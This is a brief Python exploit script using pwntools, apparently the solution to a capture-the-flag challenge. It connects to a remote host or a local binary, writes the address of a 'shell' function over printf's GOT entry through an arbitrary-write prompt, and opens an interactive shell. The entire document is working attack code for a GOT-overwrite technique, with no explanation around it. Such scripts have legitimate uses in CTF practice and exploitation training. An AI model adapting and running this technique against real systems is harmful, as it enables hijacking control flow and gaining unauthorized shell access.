#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))

else:
    io = process("./deploy/prob")

elf = ELF("./deploy/prob")
printf_got = elf.got["printf"]
shell = elf.symbols["shell"]

io.sendlineafter(b"addr > ", str(printf_got).encode())
io.sendlineafter(b"val > ", str(shell).encode())

io.interactive()
